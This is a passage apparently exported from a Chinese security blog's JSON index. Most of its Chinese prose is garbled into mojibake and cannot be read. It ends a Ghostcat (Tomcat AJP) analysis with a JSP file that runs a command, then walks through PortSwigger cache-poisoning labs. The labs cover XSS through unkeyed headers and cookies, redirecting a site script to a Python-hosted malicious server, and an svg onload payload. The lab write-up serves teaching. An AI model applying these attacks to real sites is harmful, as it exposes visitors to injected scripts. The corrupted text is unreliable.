æ–¹æ³•ï¼Œå®ƒè¿”å›ç¬¬ä¸€ä¸ªå‚æ•°å­—ç¬¦ä¸²æœ€åå‡ºç°çš„ä½ç½®ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¡¨ç¤ºä½ç½®çš„æ•´æ•°ï¼Œå¯ä»¥ç†è§£ä¸ºâ€åªæœç´¢è¯¥ä½ç½®å‰çš„å†…å®¹â€œã€‚\n\u0026quot;aaabbbaaa\u0026quot;.lastIndexOf(\u0026quot;aaa\u0026quot;); // 6 \u0026quot;aaabbbaaa\u0026quot;.lastIndexOf(\u0026quot;aaa\u0026quot;, 4); // 0 æ ¡éªŒå®Œè·¯å¾„åï¼Œè¿”å› getResource æ–¹æ³•è¯»å–æ–‡ä»¶èµ„æºã€‚\næ–‡ä»¶åŒ…å« å‰é¢è¯´è¿‡ Tomcat é»˜è®¤çš„ servlet å®¹å™¨æœ‰ä¸¤ä¸ªï¼Œå½“è®¿é—®çš„æ˜¯ jsp æ–‡ä»¶æ—¶ä¼šç”± JspServlet æ¥å¤„ç†è¯·æ±‚ã€‚è¿™ä¸ªå¤„ç†å®é™…å°±æ˜¯è§£æ jsp æ–‡ä»¶ï¼Œä½†å‰ææ˜¯è¿™ä¸ª jsp æ–‡ä»¶æ˜¯å­˜åœ¨çš„ï¼Œæ‰€ä»¥é¦–å…ˆè¦æƒ³åŠæ³•ä¸Šä¼ åˆ° webapp ç›®å½•ä¸‹ã€‚\næˆ‘ä»¬å…ˆåœ¨ webapp ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª test.jspï¼š\n\u0026lt;%Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);%\u0026gt; ä¿®æ”¹ä¸€ä¸‹ pocï¼Œå‘é€çš„ AJP è¯·æ±‚å¦‚ä¸‹ï¼š\nAJP Connector çš„å¤„ç†å’Œä¹‹å‰ç±»ä¼¼ï¼Œæˆ‘ä»¬ç›´æ¥è·Ÿè¿›åˆ° JspServlet ç±»ä¸­ã€‚è¿™æ¬¡å¤„ç†è¯·æ±‚çš„æ–¹æ³•æ˜¯ serviceï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\nè¿™é‡Œæ‹¼æ¥ path_info å’Œ servlet_path å‚æ•°å¾—åˆ°æ–‡ä»¶è·¯å¾„ï¼Œæ¥ç€è°ƒç”¨ serviceJspFile æ–¹æ³•è§£æç›®æ ‡ jsp æ–‡ä»¶ã€‚\næ‰€ä»¥æ‰¾åˆ°ç›®æ ‡æ–‡ä»¶çš„å…³é”®åœ¨äº path_info å’Œ servlet_path å‚æ•°ï¼Œå¦‚æœä¸Šä¼ çš„ jsp æ–‡ä»¶åœ¨ upload ç›®å½•ä¸‹ï¼Œservlet_path å°±è¦è®¾ç½®ä¸º /upload/ ï¼Œè€Œ URL çš„è·¯å¾„å¹¶ä¸é‡è¦ï¼Œåªè¦åç¼€æ˜¯ jsp æˆ–è€… jspx å³å¯ã€‚\nå†è·Ÿè¿›ä¸€ä¸‹ serviceJspFile æ–¹æ³•ï¼š\nåœ¨ JspServletWrapper#service æ–¹æ³•ä¸­ç¼–è¯‘å¥½ç›®æ ‡ jsp æ–‡ä»¶ï¼Œè·å–å¯¹åº”çš„ servlet å¯¹è±¡ï¼Œå†æ‰§è¡Œå®ƒçš„ service æ–¹æ³•å¼¹å‡ºè®¡ç®—å™¨ã€‚\næ€»ç»“ å¯¼è‡´æ–‡ä»¶è¯»å–æ¼æ´çš„æ˜¯ AJP è¯·æ±‚ä¸­çš„ä¸‰ä¸ªç”¨æˆ·å¯æ§å‚æ•°ï¼š\njavax.servlet.include.request_uriï¼šä¸ä¸ºç©ºå³å¯ javax.servlet.include.path_infoï¼šæ–‡ä»¶å javax.servlet.include.servlet_pathï¼šæ ¹è·¯å¾„ è€Œå½“è¯·æ±‚èµ„æºæ˜¯ jsp æˆ– jspx æ–‡ä»¶æ—¶ï¼Œç”±äº JspServlet ç±»ä¼šç¼–è¯‘æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼Œå¯¼è‡´æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸è¿‡å‰ææ˜¯èƒ½æŠŠæ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ° webapp ç›®å½•ä¸‹ã€‚\n","date":"2021-03-25","permalink":"https://zrquan.github.io/posts/ghostcat/","tags":["cve"],"title":"Ghostcatæ¼æ´åˆ†æ"},{"content":" Web Cache 101 Web ç¼“å­˜æŠ€æœ¯çš„åº”ç”¨å…¶å®éå¸¸æ™®éï¼Œåªæ˜¯å®ƒå¯¹äºç”¨æˆ·æ¥è¯´æ¯”è¾ƒé€æ˜ï¼Œå®¹æ˜“è¢«å¿½ç•¥ã€‚ä½¿ç”¨ç¼“å­˜çš„ç›®çš„æ˜¯åŠ å¿«èµ„æºæ–‡ä»¶çš„è®¿é—®é€Ÿåº¦ï¼Œè®©ç”¨æˆ·æµè§ˆé¡µé¢æ›´åŠ æµç•…ï¼ŒåŒæ—¶å‡è½» Web æœåŠ¡å™¨çš„è´Ÿè½½ã€‚æ— è®ºæ˜¯ CDNã€è´Ÿè½½å‡è¡¡ã€åå‘ä»£ç†ï¼Œç”šè‡³ä¸€äº›å¼€å‘æ¡†æ¶ï¼Œéƒ½ä¼šä½¿ç”¨ç¼“å­˜æŠ€æœ¯ï¼Œç¼“å­˜çš„å¯¹è±¡ä¸€èˆ¬æ˜¯ä¸æ€ä¹ˆæ”¹åŠ¨è€Œä¸”å¯ä»¥å…¬å¼€è®¿é—®çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ javascriptã€cssã€å›¾ç‰‡ä¹‹ç±»ã€‚\né™¤äº†æœåŠ¡ç«¯ï¼Œæµè§ˆå™¨ä¹Ÿæœ‰è‡ªå·±çš„ç¼“å­˜æœºåˆ¶ï¼Œå¯ä»¥å°†æ•°æ®ä¿å­˜åœ¨æœ¬åœ°æ–¹ä¾¿å¿«é€ŸåŠ è½½ï¼Œä¸è¿‡æœ¬æ–‡è°ˆåŠçš„ç¼“å­˜ä¸åŒ…æ‹¬è¿™ä¸€ç±»å‹ã€‚\nç¼“å­˜é”® ç¼“å­˜æœåŠ¡å™¨å¤‡ä»½äº†èµ„æºåï¼Œéœ€è¦åˆ¤æ–­æ¥ä¸‹æ¥çš„è¯·æ±‚æ˜¯å¦å‘½ä¸­ç¼“å­˜ï¼Œå¦‚æœè¯·æ±‚çš„å†…å®¹å·²ç»åœ¨ç¼“å­˜ä¸­äº†ï¼Œå°±ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œå¦åˆ™è½¬å‘è¯·æ±‚ç»™ Web æœåŠ¡å™¨ï¼Œå¹¶ç¼“å­˜å®ƒçš„å“åº”ã€‚\né‚£ä¹ˆå¦‚ä½•åˆ¤æ–­è¯·æ±‚æ˜¯å¦å‘½ä¸­ç¼“å­˜å‘¢ï¼Ÿå…¨æ–‡åŒ¹é…è‚¯å®šä¸å¤ªåˆç†ï¼Œå› ä¸ºå³ä½¿è®¿é—®çš„èµ„æºç›¸åŒï¼Œè¯·æ±‚ä¹Ÿå¯èƒ½æœ‰å¾ˆå¤šå·®å¼‚ï¼Œæ¯”å¦‚æ—¶é—´æˆ³ã€cookieã€éšæœºå€¼ç­‰ç­‰ã€‚ä¸€èˆ¬å¯ä»¥é€šè¿‡ URLã€Hostã€è¯·æ±‚æ–¹æ³•ç­‰ç‰¹å¾ç‚¹ç»“åˆèµ·æ¥åˆ¤æ–­ï¼Œç§°ä¹‹ä¸ºç¼“å­˜é”®(cache keys)ã€‚åªè¦ç¼“å­˜é”®åŒ¹é…ï¼Œå…¶ä»–å†…å®¹å³ä½¿æœ‰å·®å¼‚ï¼Œä¹Ÿè§†ä¸ºå‘½ä¸­ç¼“å­˜ã€‚\nè¯·æ±‚ä¸­çš„ä¸€äº›è¾“å…¥è™½ç„¶æ²¡æœ‰ä½œä¸ºç¼“å­˜é”®ï¼Œä½†ä¹Ÿå¯èƒ½å½±å“å“åº”çš„å†…å®¹ï¼Œé‚£ä¹ˆå°±å¯èƒ½äº§ç”Ÿä¸€äº›é—®é¢˜ã€‚æ¯”å¦‚ä»¥ä¸‹ä¸¤ä¸ªè¯·æ±‚ï¼Œå®ƒä»¬çš„é”®ç›¸åŒ(URL å’Œ Host å¤´)ï¼Œä½† Cookie ä¸åŒï¼š\nGET /blog/post.php?mobile=1 HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 â€¦ Firefox/57.0 Cookie: language=pl; Connection: close GET /blog/post.php?mobile=1 HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 â€¦ Firefox/57.0 Cookie: language=en; Connection: close ç¼“å­˜æœåŠ¡å™¨å¯¹ç¬¬ä¸€ä¸ªè¯·æ±‚çš„å“åº”è¿›è¡Œç¼“å­˜åï¼Œç”±äºç¬¬äºŒä¸ªè¯·æ±‚å‘½ä¸­äº†ç¼“å­˜ï¼Œç¼“å­˜æœåŠ¡å™¨ç›´æ¥è¿”å›ç¬¬ä¸€ä¸ªè¯·æ±‚çš„å“åº”ï¼Œå¯¼è‡´é¡µé¢çš„è¯­è¨€ä¸æ­£ç¡®ã€‚è¿™é‡Œçš„ cookie å¯ä»¥ç§°ä¸ºéé”®è¾“å…¥(unkeyed input)ã€‚\nCache-Control Cache-Control æ˜¯ç”¨æ¥æ§åˆ¶ç¼“å­˜ç­–ç•¥çš„å“åº”å¤´ï¼Œå®ƒçš„å€¼ç”±ä¸€ä¸ªæˆ–å¤šä¸ªç¼“å­˜æŒ‡ä»¤æ„æˆã€‚æ¯”å¦‚ä¸‹è¿°å“åº”å¤´åŒ…å«ä¸¤ä¸ªæŒ‡ä»¤ï¼š\nCache-Control: public, max-age=60 å…¶ä¸­ public è¡¨ç¤ºä»»æ„ç¼“å­˜æœåŠ¡å™¨éƒ½å¯ä»¥å¤‡ä»½å“åº”å†…å®¹ï¼Œ max-age=60 è¡¨ç¤º 60 ç§’åéœ€è¦æ›´æ–°ç¼“å­˜ã€‚\nTable 1: å¸¸è§çš„ Cache-Control æŒ‡ä»¤ æŒ‡ä»¤ æè¿° public ä»»ä½•ç¼“å­˜éƒ½å¯ä»¥å­˜å‚¨å“åº”çš„å‰¯æœ¬ private åªæœ‰å“åº”çš„æœ€ç»ˆæ¥æ”¶è€…(å®¢æˆ·ç«¯æˆ–æµè§ˆå™¨)æ‰å¯ä»¥å­˜å‚¨è¯¥å“åº”çš„å‰¯æœ¬ max-age å®šä¹‰ç¼“å­˜çš„è¿‡æœŸæ—¶é—´(å•ä½æ˜¯ç§’) no-store ç¦æ­¢å¯¹å“åº”è¿›è¡Œç¼“å­˜ no-cache å…ˆæ£€æŸ¥ web æœåŠ¡å™¨ï¼Œå¦‚æœå†…å®¹æ²¡æœ‰æ›´æ–°åˆ™ç»§ç»­ä½¿ç”¨ç¼“å­˜(304) must-revalidate å’Œ max-age ä¸€èµ·ä½¿ç”¨ï¼Œè®¾ç½®ä¸€ä¸ªæ—¶é—´ï¼Œåœ¨è¯¥æ—¶é—´å†… no-cache ä¸éœ€è¦éªŒè¯ web æœåŠ¡å™¨çš„å†…å®¹ immutable å‘Šè¯‰æµè§ˆå™¨æ–‡ä»¶æœ‰æ— å¯å˜å†…å®¹çš„æŒ‡ä»¤ï¼Œå¦‚æœå†…å®¹æ— æ›´æ–°ï¼Œåˆ™æ°¸è¿œä¸ä¼šé‡æ–°éªŒè¯ç¼“å­˜ ç¼“å­˜æŠ•æ¯’ ä¸Šæ–‡æåˆ°ï¼Œåœ¨ä¸€ä¸ª http è¯·æ±‚ä¸­ï¼Œé™¤äº†ç¼“å­˜é”®å¤–çš„éƒ¨åˆ†å¯ä»¥ç§°ä¸ºéé”®è¾“å…¥ï¼Œå®ƒä»¬ä¸ä¼šå½±å“åˆ¤æ–­ç¼“å­˜æ˜¯å¦å‘½ä¸­ã€‚å¦‚æœéé”®è¾“å…¥å¯ä»¥å½±å“å“åº”ï¼Œé‚£æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šæ§åˆ¶ç¼“å­˜æœåŠ¡å™¨å¤‡ä»½çš„å†…å®¹ï¼Œä»è€Œå½±å“å…¶ä»–ç”¨æˆ·è®¿é—®è¯¥èµ„æºæ—¶çš„è¡Œä¸ºï¼Œè¿™å°±æ˜¯ç¼“å­˜æŠ•æ¯’ã€‚\næŒ–æ˜ç¼“å­˜æŠ•æ¯’æ¼æ´çš„æ–¹æ³•1ï¼š\næ‰¾åˆ°å¯ä»¥å½±å“å“åº”çš„éé”®è¾“å…¥ï¼› ç ”ç©¶éé”®è¾“å…¥çš„ä½œç”¨ï¼Œèƒ½å¦ä½œä¸ºæŸç§æ”»å‡»çš„è¾“å…¥ç‚¹ï¼› å°è¯•å°†å®ƒå†™å…¥åˆ°ç¼“å­˜ä¸­ã€‚ å“åº”æ˜¯å¦è¢«ç¼“å­˜å—å¤šç§å› ç´ å½±å“â€”â€”æ–‡ä»¶æ‰©å±•åï¼Œå†…å®¹ç±»å‹ï¼Œè·¯ç”±ï¼ŒçŠ¶æ€ä»£ç å’Œå“åº”å¤´ç­‰ã€‚åŒæ—¶ï¼Œåœ¨ç ”ç©¶éé”®è¾“å…¥çš„å½±å“æ—¶ï¼Œç¼“å­˜çš„å“åº”å¯èƒ½å¹²æ‰°æˆ‘ä»¬çš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¦ä½¿ç”¨ cache buster(å³åœ¨ç¼“å­˜é”®ä¸­æ”¾ä¸€æ®µéšæœºå­—ç¬¦ä¸²)ï¼Œç¡®è®¤å¾—åˆ° web æœåŠ¡å™¨çš„å“åº”ï¼Œè¿˜èƒ½é¿å…å½±å“æ­£å¸¸ç”¨æˆ·ã€‚\nä¸‹é¢é€šè¿‡ portswigger æä¾›çš„é¶åœºï¼Œè¯´æ˜ç¼“å­˜æŠ•æ¯’çš„ä¸€äº›åˆ©ç”¨æ–¹å¼ã€‚\nxss in headers ä¸€èˆ¬æˆ‘ä»¬é‡åˆ°çš„åå°„å‹ xssï¼Œè¾“å…¥ç‚¹éƒ½æ˜¯å† GET å‚æ•°ä¸­ï¼Œé€šè¿‡è¯±å¯¼å—å®³è€…è®¿é—®æ¶æ„é“¾æ¥æ¥è§¦å‘ payloadã€‚å¦‚æœåœ¨ä¸€ä¸ªè¯·æ±‚å¤´ä¸­å­˜åœ¨ xss çš„ç‚¹æˆ‘ä»¬å¾ˆéš¾å»åˆ©ç”¨ï¼Œå› ä¸ºæ²¡åŠæ³•æ§åˆ¶å—å®³è€…çš„è¯·æ±‚å¤´ã€‚\nä½†ç»“åˆç¼“å­˜æŠ•æ¯’ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦è‡ªå·±å‘é€ payload æ¥æ¯’åŒ–ç¼“å­˜ï¼Œå½“å…¶ä»–ç”¨æˆ·æ­£å¸¸è®¿é—®èµ„æºå°±ä¼šå—åˆ°æ”»å‡»ã€‚\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåº”ç”¨é€šè¿‡ X-Forwarded-Host å¤´æ¥è·å–åœ°å€ï¼Œå¯¼å…¥ js èµ„æºï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼š\nå½“ä¸€ä¸ªæ­£å¸¸ç”¨æˆ·è®¿é—®ä¸Šé¢çš„åœ°å€ï¼Œè¿”å›çš„å´æ˜¯å¸¦æœ‰ xss payload çš„é¡µé¢ï¼š\nURL åé¢çš„ ?x æ˜¯ä¸ºäº†ç¡®ä¿è¯·æ±‚ä¸ä¼šå‘½ä¸­ç¼“å­˜è€Œæ·»åŠ çš„ cache busterï¼Œå¯ä»¥çœ‹åˆ°å“åº”ä¸­ X-Cache ä¸º missã€‚\nxss in cookie å’Œè¯·æ±‚å¤´ä¸€æ ·ï¼Œcookie ä¸­çš„ xss è¾“å…¥ç‚¹ä¹Ÿæ˜¯å¾ˆéš¾åˆ©ç”¨çš„ï¼Œä½†ç¼“å­˜æŠ•æ¯’å¯ä»¥å¤§å¤§å¢åŠ å…¶å±å®³æ€§ã€‚ä¸è¿‡ cookie ä¸­çš„ç¼“å­˜æŠ•æ¯’å¾ˆå®¹æ˜“è¢«å¼€æ”¾äººå‘˜æ³¨æ„åˆ°ï¼Œå› ä¸ºå¾ˆå¯èƒ½å¯¼è‡´å„ç§ bugã€‚\nå¦‚ä¸‹å›¾ï¼Œå“åº”ä¸­æ‹¼æ¥äº† cookie çš„ä¸€ä¸ªå‚æ•°å€¼å¯¼è‡´ xssï¼ŒæŠ•æ¯’åå¯ä»¥æ”»å‡»ä»»æ„è®¿é—®è¯¥èµ„æºçš„ç”¨æˆ·ï¼š\né‡å®šå‘æ”»å‡» é™¤äº† xss å¤–ï¼Œä»»æ„åœ°å€é‡å®šå‘ä¹Ÿæ˜¯ä¸€ç§åˆ©ç”¨æ–¹å¼ã€‚ä¸‹è¿°çš„åº”ç”¨å¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨ httpsï¼Œå¦‚æœ X-Forwarded-Scheme ä¸æ˜¯ https åˆ™è¿”å› 302 é‡å®šå‘ï¼š\nGET /random HTTP/1.1 Host: innocent-site.com X-Forwarded-Scheme: nothttps HTTP/1.1 301 moved permanently Location: https://innocent-site.com/random åœ¨è¿™ä¸ªè¯·æ±‚ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶è·³è½¬ç›®æ ‡çš„ pathï¼Œå†æšä¸¾è¯·æ±‚å¤´å‘ç° X-Forwarded-Host å¯ä»¥æ§åˆ¶è·³è½¬çš„ hostã€‚\næ ¹æ®é¢˜ç›®æˆ‘ä»¬éœ€è¦æˆåŠŸå®æ–½ XSS æ”»å‡»ï¼Œé‚£ä¹ˆå°±è¦åˆ©ç”¨é‡å®šå‘æ¥å¼•å…¥æ¶æ„ js æ–‡ä»¶ã€‚\né¦–å…ˆæ‰¾ä¸€ä¸ªç½‘ç«™ä¼šæ­£å¸¸å¯¼å…¥çš„ js æ–‡ä»¶ /resources/js/tracking.js ï¼Œé€šè¿‡ç¼“å­˜æŠ•æ¯’è®©å¯¹è¯¥æ–‡ä»¶çš„è®¿é—®é‡å®šå‘åˆ°æ¶æ„æœåŠ¡å™¨çš„åŒåæ–‡ä»¶ä¸Šã€‚\næ³¨æ„æ¶æ„æœåŠ¡å™¨éœ€è¦æ”¯æŒ httpsï¼Œå¯ä»¥ç”¨ python å¿«é€Ÿæ­å»ºä¸€ä¸ªï¼š\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler, HTTPStatus import ssl # given a pem file ... openssl req -new -x509 -keyout yourpemfile.pem -out yourpemfile.pem -days 365 -nodes httpd = HTTPServer(('0.0.0.0', 443), SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, server_side=True, certfile='yourpemfile.pem') httpd.serve_forever() ç„¶ååˆ·æ–°ä¸€ä¸‹ç½‘é¡µï¼Œå¯ä»¥çœ‹åˆ°å®ƒä»æ¶æ„æœåŠ¡å™¨è¯·æ±‚ js æ–‡ä»¶ï¼š\ndom xss å¦‚æœæ‰¾ä¸åˆ°ç›´æ¥çš„ xss æ³¨å…¥ç‚¹ï¼Œä¹Ÿæ²¡åŠæ³•æ§åˆ¶ js æ–‡ä»¶çš„æ¥æºï¼Œå¯ä»¥è€ƒè™‘ä» dom xss å…¥æ‰‹ã€‚ç°åœ¨çš„ web é¡µé¢å†…å®¹å¾ˆå¤šéƒ½æ˜¯åœ¨è®¿é—®æ—¶åŠ¨æ€åŠ è½½æ›´æ–°çš„ï¼Œæ¯”å¦‚è®¿é—® json æ–‡ä»¶æ¥è·å–æ•°æ®ï¼Œæ›´æ–°åˆ°ç°æœ‰çš„ dom æ ‘ä¸Šã€‚\né¦–å…ˆåˆ†æåº”ç”¨çš„å‰ç«¯ä»£ç ï¼Œæ‰¾åˆ° dom æ³¨å…¥ç‚¹ï¼š\nä»ä¸Šå›¾å¯ä»¥çœ‹åˆ° j.contry å±æ€§æ˜¯ä¸€ä¸ªæ”»å‡»ç‚¹ï¼Œå®ƒä»ä¸€ä¸ªè¿œç¨‹ json æ–‡ä»¶ä¸­è·å–ï¼Œå¦‚æœèƒ½æ§åˆ¶è¿™ä¸ª json æ–‡ä»¶å°±èƒ½å†™å…¥ payloadã€‚\nåœ¨ä¸»é¡µæ‰¾åˆ° initGeoLocate å‡½æ•°è°ƒç”¨ï¼Œå‘ç°å‚æ•°æ˜¯åŠ¨æ€æ‹¼æ¥çš„ï¼Œç»è¿‡æµ‹è¯•çŸ¥é“å¯ä»¥é€šè¿‡ X-Forwarded-Host æ¥æ§åˆ¶ï¼š\næ‰å‘ç°é¶åœºæä¾›äº† exploit server è®©ç”¨æˆ·éƒ¨ç½² payload æ–‡ä»¶ï¼Œåœ¨é¶åœºä¸Šæ–¹æœ‰æŒ‰é’®å¯ä»¥æ‰“å¼€ã€‚\néƒ¨ç½²ä¸€ä¸ªæ¶æ„çš„ geolocate.json æ–‡ä»¶ï¼Œè®°å¾—è®¾ç½® https å’Œ Access-Control-Allow-Originï¼Œä¸ç„¶ä¼šæ‹’ç»è·¨åŸŸè¯·æ±‚ã€‚\næ³¨æ„ payload ä¸èƒ½ä½¿ç”¨ \u0026lt;script\u0026gt; ï¼Œå› ä¸ºé¡µé¢åŠ è½½å®Œå·²ç»é”™è¿‡å®ƒçš„æ‰§è¡Œé˜¶æ®µäº†ï¼Œéœ€è¦é€šè¿‡ html äº‹ä»¶æ¥è§¦å‘ payloadã€‚\næ¥ç€å°±æ˜¯å‘ç¼“å­˜æŠ•æ¯’ï¼ŒæˆåŠŸååˆ·æ–°ä¸»é¡µã€‚åº”ç”¨ä¼šè®¿é—®æ¶æ„ json æ–‡ä»¶å¹¶è°ƒç”¨ innerHTML å‡½æ•°å°† payload æ›´æ–°åˆ° dom æ ‘ä¸Šï¼Œè§¦å‘å¼¹çª—ã€‚\nVary header ç®€å•åœ°è¯´ï¼ŒVary å“åº”å¤´å¯ä»¥æŒ‡å®šé¢å¤–çš„è¯·æ±‚å¤´ä½œä¸ºç¼“å­˜é”®çš„ä¸€éƒ¨åˆ†ï¼Œåˆ©ç”¨ Vary å¤´æˆ‘ä»¬å¯ä»¥åšåˆ°æ›´ç²¾ç¡®ã€æ›´æœ‰é’ˆå¯¹æ€§çš„ç¼“å­˜æŠ•æ¯’æ”»å‡»ã€‚\næ¯”å¦‚å½“ Vary å¤´æŒ‡å®šäº† User-Agent ä½œä¸ºç¼“å­˜é”®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ User-Agent æ¥æ”»å‡»ä½¿ç”¨ç‰¹å®šæµè§ˆå™¨çš„ç”¨æˆ·ã€‚\nç¼“å­˜çº ç¼  åœ¨ä¸Šä¸€ç« èŠ‚ï¼Œæˆ‘ä»¬è¿›è¡Œç¼“å­˜æŠ•æ¯’æ”»å‡»æ—¶ï¼Œç¬¬ä¸€æ­¥æ˜¯å…ˆæ‰¾åˆ°éé”®è¾“å…¥ï¼Œå› ä¸ºåœ¨ç¼“å­˜é”®ä¸­å†™å…¥ payloadï¼Œå³ä½¿å¯ä»¥å½±å“å“åº”ï¼Œæ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚ä¹Ÿä¸ä¼šå‘½ä¸­è¯¥ç¼“å­˜ã€‚\nä½†æ€»æœ‰äº›åº”ç”¨ä¼šå¯¹å®¢æˆ·ç«¯è¾“å…¥è¿›è¡Œå„ç§å¤„ç†ï¼Œä½¿å¾—æœ¬æ¥åº”è¯¥æ˜¯ç¼“å­˜é”®çš„è¾“å…¥è¢«æ’é™¤åœ¨å¤–ï¼Œè¿™å°±äº§ç”Ÿäº†æ›´å¤šçš„é€”å¾„æ¥è¿›è¡Œç¼“å­˜æŠ•æ¯’ã€‚\næŒ–æ˜ç¼“å­˜çº ç¼ æ¼æ´çš„æ–¹æ³•2ï¼š\né¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªé¡µé¢ï¼Œå¯ä»¥é€šè¿‡å®ƒåˆ¤æ–­å“åº”æœ‰æ²¡æœ‰è¢«ç¼“å­˜ï¼Œæ¯”å¦‚ï¼š\né€šè¿‡å“åº”å¤´åˆ¤æ–­ï¼ŒX-Cache ä¹‹ç±»çš„ï¼› é€šè¿‡å“åº”å†…å®¹çš„åŒºåˆ«æ¥åˆ¤æ–­ï¼› é€šè¿‡å“åº”æ—¶é—´åˆ¤æ–­(ä¸å¤ªå¯é )ã€‚ å¦‚æœå“åº”ä¸­æ²¡æœ‰åŒ…å«å¯ä»¥åˆ¤æ–­ç¼“å­˜æ˜¯å¦ç”Ÿæ•ˆçš„ç‰¹å¾ï¼Œæ¯”å¦‚ X-Cacheã€å‚æ•°åå°„ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å“åº”çš„å·®å¼‚å»åˆ¤æ–­ã€‚ä½†è¿™ä¸ªæ–¹æ³•æœ‰ä¸ªé—®é¢˜æ˜¯ä¼šè¢«ç¼“å­˜æ‰€å¹²æ‰°ï¼Œæˆ‘ä»¬ä¸çŸ¥é“æ˜¯åœ¨å’Œç¼“å­˜æœåŠ¡å™¨è¿˜æ˜¯ web æœåŠ¡å™¨é€šä¿¡ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸Š cache buster æ’é™¤å¹²æ‰°ã€‚\nåœ¨èƒ½å¤Ÿç¡®è®¤è¯·æ±‚æ˜¯å¦å‘½ä¸­ç¼“å­˜çš„å‰æä¸‹ï¼Œç ”ç©¶æœåŠ¡ç«¯å¯¹ç¼“å­˜é”®çš„å¤„ç†æ–¹å¼ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰è¢«æ’é™¤çš„è¾“å…¥ã€‚\nä¸€äº›å¸¸è§çš„æƒ…å†µï¼š\næ’é™¤æ‰€æœ‰è¯·æ±‚å‚æ•°ï¼› æ’é™¤ä¸ªåˆ«è¯·æ±‚å‚æ•°ï¼› è¿›è¡Œæ ‡å‡†åŒ–å¤„ç†ã€‚ æœ€åæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ gadget æ¥æ”»å‡»å…¶ä»–ç”¨æˆ·ï¼Œé€šå¸¸æ˜¯åå°„å‹ xssã€ä»»æ„é‡å®šå‘ä¹‹ç±»éœ€è¦è¯±å¯¼ç”¨æˆ·è®¿é—®çš„æ¼æ´ï¼Œè¿›è¡Œç¼“å­˜æŠ•æ¯’ååªè¦ç”¨æˆ·æ­£å¸¸æµè§ˆé¡µé¢å°±ä¼šè¢«æ”»å‡»ã€‚\nä¸‹é¢é€šè¿‡ portswigger æä¾›çš„é¶åœºï¼Œè¯´æ˜ä¸€äº›å¯¼è‡´ç¼“å­˜çº ç¼ çš„æƒ…å†µï¼Œä»¥åŠåˆ©ç”¨æ–¹å¼ã€‚\næ’é™¤è¯·æ±‚å‚æ•° ä¸‹å›¾å¯¹ä¿®æ”¹äº†è¯·æ±‚å‚æ•°åçš„å“åº”è¿›è¡Œæ¯”è¾ƒï¼Œé€šè¿‡å“åº”ä¸­ X-Cache å¤´å’Œåå°„çš„å‚æ•°ï¼Œéƒ½å¯ä»¥åˆ¤æ–­è¯·æ±‚å‚æ•°ä¸åœ¨ç¼“å­˜é”®ä¸­ï¼š\næ‰€ä»¥å¯ä»¥é€šè¿‡è¯·æ±‚å‚æ•°æ¯’åŒ–ç¼“å­˜ï¼Œä½¿å…¶ä»–ç”¨æˆ·å—åˆ° XSS æ”»å‡»ã€‚\næ’é™¤ä¸ªåˆ«å‚æ•° å’Œä¸Šä¸€ä¸ªä¾‹å­å·®ä¸å¤šï¼Œä¸è¿‡æ‰¾åˆ°ä¸ªåˆ«æ²¡æœ‰åŠ è¿›ç¼“å­˜é”®çš„å‚æ•°éœ€è¦èŠ±ç‚¹æ—¶é—´ã€‚å¯ä»¥ä½¿ç”¨ param-miner çš„ Guest GET parameters åŠŸèƒ½æ¥æšä¸¾ï¼š\nç„¶åä¿®æ”¹ä¸€ä¸‹ utm_content å‚æ•°ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥å‘½ä¸­ä¹‹å‰å“åº”çš„ç¼“å­˜ï¼Œå¦‚æœå¯ä»¥å‘½ä¸­è¯´æ˜å®ƒä¸æ˜¯ç¼“å­˜é”®ã€‚åœ¨è¯¥å‚æ•°å†™å…¥ xss payload è¿›è¡Œç¼“å­˜æŠ•æ¯’ï¼š\nå‚æ•°ä¼ªè£… æœ‰æ—¶å€™å­˜åœ¨æ¼æ´çš„å‚æ•°åˆšå¥½ä¹Ÿæ˜¯ç¼“å­˜é”®ï¼Œæ˜¯ä¸æ˜¯å°±æ— æ³•åˆ©ç”¨äº†å‘¢ï¼Ÿæ–¹æ³•è¿˜æ˜¯æœ‰çš„ï¼Œä¸è¿‡æ¡ä»¶å¾ˆè‹›åˆ»ã€‚\nåˆ©ç”¨ web æœåŠ¡å™¨å’Œç¼“å­˜è§£æå‚æ•°æ—¶çš„å·®å¼‚ï¼Œå¯ä»¥å°†è¾“å…¥ä»ç¼“å­˜é”®æ’é™¤ã€‚æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š\nGET /?example=123?excluded_param=\u0026lt;svg/onload=alert(1)\u0026gt; ä¸€èˆ¬æƒ…å†µä¸‹é—®å·å‡ºç°åœ¨ GET 